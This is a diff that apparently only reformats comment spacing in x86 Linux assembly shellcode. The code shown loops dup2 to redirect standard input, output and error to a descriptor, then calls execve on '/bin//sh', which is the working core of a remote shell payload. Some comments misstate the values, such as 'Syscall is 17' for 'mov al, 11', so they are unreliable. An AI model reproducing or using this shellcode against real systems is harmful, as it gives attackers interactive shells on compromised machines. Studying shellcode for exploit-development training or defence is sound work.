@@ -21,12 +21,12 @@ _start:
 	int 0x80
 	
 	;dup2 - 2, 1, 0
-	mov ebx, eax		; $ebx = File descriptor address
-	mov cl, 3			; $ecx = New file descriptor = 0
+	mov ebx, eax			; $ebx = File descriptor address
+	mov cl, 3				; $ecx = New file descriptor = 0
 	int 0x80
 bucle:
 	xor eax, eax
-	mov al, 0x3f  		; Syscall is 63 = Dup2
+	mov al, 0x3f  			; Syscall is 63 = Dup2
 	int 0x80
 	dec ecx
 	jns bucle
@@ -45,13 +45,13 @@ bucle:
 
 	
 	; Execve
-	push eax 		; Push 0x0
-	push 0x68732f2f		; Push '//sh' string
-	push 0x6e69622f		; Push '/bin' string
-	mov ebx, esp 		; $ebx =  '/bin//sh' and 0x0
-	push eax 		; Push  0x0
-	mov edx, esp 		; $edx = 0x0
-	push ebx 		; Push $ebx =  '/bin//sh' and 0x0
-	mov ecx, esp 		; Address of stack, containing 0x0, '/bin//sh' and 0x0
-	mov al, 11  		; Syscall is 17 = Execve
+	push eax 				; Push 0x0
+	push 0x68732f2f			; Push '//sh' string
+	push 0x6e69622f			; Push '/bin' string
+	mov ebx, esp 			; $ebx =  '/bin//sh' and 0x0
+	push eax 				; Push  0x0
+	mov edx, esp 			; $edx = 0x0
+	push ebx 				; Push $ebx =  '/bin//sh' and 0x0
+	mov ecx, esp 			; Address of stack, containing 0x0, '/bin//sh' and 0x0
+	mov al, 11  			; Syscall is 17 = Execve
 	int 0x80
